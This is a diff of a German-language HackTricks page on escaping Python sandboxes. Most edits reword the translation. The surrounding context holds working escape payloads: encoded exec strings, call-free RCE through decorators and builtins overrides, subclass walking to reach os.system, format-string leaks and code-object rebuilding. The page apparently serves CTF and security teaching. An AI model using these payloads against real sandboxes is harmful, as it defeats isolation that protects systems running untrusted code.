@@ -1,33 +1,25 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 Dies sind einige Tricks, um die Python-Sandbox-Schutzmaßnahmen zu umgehen und beliebige Befehle auszuführen.
 
-## Befehlsausführungsbibliotheken
+## Bibliotheken zur Befehlsausführung
 
-Das erste, was Sie wissen müssen, ist, ob Sie Code direkt mit einer bereits importierten Bibliothek ausführen können oder ob Sie eine dieser Bibliotheken importieren könnten:
+Das erste, was du wissen musst, ist, ob du Code direkt mit einer bereits importierten Bibliothek ausführen kannst oder ob du eine dieser Bibliotheken importieren könntest:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -66,7 +58,7 @@ Denke daran, dass die _**open**_ und _**read**_ Funktionen nützlich sein könne
 Die **Python2 input()** Funktion ermöglicht das Ausführen von Python-Code, bevor das Programm abstürzt.
 {% endhint %}
 
-Python versucht, **Bibliotheken zuerst aus dem aktuellen Verzeichnis zu laden** (der folgende Befehl zeigt an, wo Python Module lädt): `python3 -c 'import sys; print(sys.path)'`
+Python versucht, **zuerst Bibliotheken aus dem aktuellen Verzeichnis zu laden** (der folgende Befehl zeigt an, wo Python Module lädt): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
@@ -75,7 +67,7 @@ Python versucht, **Bibliotheken zuerst aus dem aktuellen Verzeichnis zu laden** 
 ### Standardpakete
 
 Hier findest du eine **Liste der vorinstallierten** Pakete: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Beachte, dass du aus einem Pickle die Python-Umgebung dazu bringen kannst, **willkürliche Bibliotheken** zu importieren, die im System installiert sind.\
+Beachte, dass du aus einem Pickle die Python-Umgebung **beliebige Bibliotheken** importieren kannst, die im System installiert sind.\
 Zum Beispiel wird der folgende Pickle, wenn er geladen wird, die Pip-Bibliothek importieren, um sie zu verwenden:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -114,7 +106,7 @@ Dieses Paket heißt `Reverse`. Es wurde jedoch speziell so gestaltet, dass, wenn
 Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (überprüfen Sie den Walross-Operator).
 {% endhint %}
 
-Wenn bestimmte Zeichen verboten sind, können Sie die **Hex-/Oktal-/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
+Wenn bestimmte Zeichen verboten sind, können Sie die **Hex-/Oktal/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -175,7 +167,7 @@ Es ist auch möglich, es mit anderen Kodierungen zu umgehen, z.B. `raw_unicode_e
 
 ## Python-Ausführung ohne Aufrufe
 
-Wenn Sie sich in einem Python-Gefängnis befinden, das **keine Aufrufe zulässt**, gibt es dennoch einige Möglichkeiten, **willkürliche Funktionen, Code** und **Befehle** auszuführen.
+Wenn Sie sich in einem Python-Gefängnis befinden, das **keine Aufrufe zulässt**, gibt es dennoch einige Möglichkeiten, **willkürliche Funktionen, Code** und **Befehle** **auszuführen**.
 
 ### RCE mit [Dekoratoren](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -316,7 +308,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Datei mit builtins Hilfe & Lizenz lesen
+### Datei mit Builtins Hilfe & Lizenz lesen
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -330,7 +322,7 @@ pass
 * [**Builtins-Funktionen von python2**](https://docs.python.org/2/library/functions.html)
 * [**Builtins-Funktionen von python3**](https://docs.python.org/3/library/functions.html)
 
-Wenn Sie auf das **`__builtins__`**-Objekt zugreifen können, können Sie Bibliotheken importieren (beachten Sie, dass Sie hier auch eine andere Zeichenfolgenrepräsentation verwenden könnten, die im letzten Abschnitt gezeigt wurde):
+Wenn Sie auf das **`__builtins__`** Objekt zugreifen können, können Sie Bibliotheken importieren (beachten Sie, dass Sie hier auch eine andere Zeichenfolgenrepräsentation verwenden könnten, die im letzten Abschnitt gezeigt wurde):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -340,7 +332,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 Wenn Sie `__builtins__` nicht haben, können Sie nichts importieren und auch keine Dateien lesen oder schreiben, da **alle globalen Funktionen** (wie `open`, `import`, `print`...) **nicht geladen sind**.\
 Allerdings **importiert Python standardmäßig viele Module in den Speicher**. Diese Module mögen harmlos erscheinen, aber einige von ihnen **importieren auch gefährliche** Funktionalitäten, die genutzt werden können, um sogar **willkürliche Codeausführung** zu erlangen.
 
-In den folgenden Beispielen können Sie beobachten, wie man einige dieser "**harmlosen**" Module ausnutzen kann, um **auf** **gefährliche** **Funktionalitäten** in ihnen zuzugreifen.
+In den folgenden Beispielen können Sie beobachten, wie man einige dieser "**harmlosen**" Module ausnutzen kann, um **gefährliche** **Funktionalitäten** in ihnen **zuzugreifen**.
 
 **Python2**
 ```python
@@ -525,7 +517,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Darüber hinaus, wenn Sie denken, dass **andere Bibliotheken** möglicherweise **Funktionen aufrufen können, um Befehle auszuführen**, können wir auch **nach Funktionsnamen** innerhalb der möglichen Bibliotheken **filtern**:
+Außerdem, wenn Sie denken, dass **andere Bibliotheken** möglicherweise **Funktionen aufrufen können, um Befehle auszuführen**, können wir auch **nach Funktionsnamen** innerhalb der möglichen Bibliotheken **filtern**:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -686,11 +678,11 @@ You can check the output of this script on this page:
 
 ## Python Format String
 
-Wenn Sie eine **Zeichenkette** an Python **senden**, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Informationen von Python** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um beispielsweise auf Globals oder Builtins zuzugreifen.
+Wenn Sie eine **Zeichenkette** an Python **senden**, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Informationen von Python** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um auf Globals oder Builtins zuzugreifen.
 
 {% hint style="info" %}
 Es gibt jedoch eine **Einschränkung**, Sie können nur die Symbole `.[]` verwenden, sodass Sie **keinen beliebigen Code ausführen können**, sondern nur Informationen lesen.\
-_**Wenn Sie wissen, wie man durch diese Schwachstelle Code ausführt, kontaktieren Sie mich bitte.**_
+_**Wenn Sie wissen, wie man über diese Schwachstelle Code ausführt, kontaktieren Sie mich bitte.**_
 {% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
@@ -720,7 +712,7 @@ Einige andere interessante Eigenschaften von Format-Strings sind die Möglichkei
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Darüber hinaus ist es möglich, **neue Formatter** in Klassen zu **codieren**:
+Darüber hinaus ist es möglich, **neue Formatter** in Klassen zu codieren:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -760,7 +752,7 @@ Wenn Sie mehr über **python bytecode** erfahren möchten, lesen Sie diesen **to
 
 In einigen CTFs könnte Ihnen der Name einer **benutzerdefinierten Funktion, in der sich das Flag** befindet, bereitgestellt werden, und Sie müssen die **Interna** der **Funktion** einsehen, um es zu extrahieren.
 
-Dies ist die Funktion, die untersucht werden soll:
+Dies ist die Funktion, die Sie inspizieren sollten:
 ```python
 def get_flag(some_input):
 var1=1
@@ -807,7 +799,7 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
-### Informationen zum Code abrufen
+### Code-Information abrufen
 ```python
 # Another example
 s = '''
@@ -906,7 +898,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compiling Python
 
 Jetzt stellen wir uns vor, dass Sie irgendwie **die Informationen über eine Funktion, die Sie nicht ausführen können, dumpen** können, aber Sie **müssen** sie **ausführen**.\
-Wie im folgenden Beispiel, Sie **können auf das Code-Objekt** dieser Funktion zugreifen, aber nur durch das Lesen des Disassemblierens **wissen Sie nicht, wie man das Flag berechnet** (_stellen Sie sich eine komplexere `calc_flag`-Funktion vor_)
+Wie im folgenden Beispiel, Sie **können auf das Code-Objekt** dieser Funktion zugreifen, aber nur durch das Lesen des Disassemblies **wissen Sie nicht, wie man das Flag berechnet** (_stellen Sie sich eine komplexere `calc_flag`-Funktion vor_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -921,7 +913,7 @@ return "Nope"
 ```
 ### Erstellen des Code-Objekts
 
-Zuerst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion zu leaken:
+Zunächst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion zu exécutieren:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### Wiederherstellung einer geleakten Funktion
 
 {% hint style="warning" %}
-Im folgenden Beispiel werden wir alle Daten, die benötigt werden, um die Funktion direkt aus dem Funktionscodeobjekt wiederherzustellen, entnehmen. In einem **realen Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **du geleakt** haben musst.
+Im folgenden Beispiel werden wir alle Daten, die benötigt werden, um die Funktion direkt aus dem Funktionscodeobjekt wiederherzustellen, verwenden. In einem **echten Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **du geleakt** haben musst.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1018,7 +1010,7 @@ Mit Tools wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann
 
 ### Assert
 
-Python, das mit Optimierungen mit dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeden Code, der von dem Wert von **debug** abhängt.\
+Python, das mit Optimierungen mit dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeden Code, der vom Wert von **debug** abhängt.\
 Daher sind Überprüfungen wie
 ```python
 def check_permission(super_user):
@@ -1039,23 +1031,18 @@ wird umgangen
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Unterstütze HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
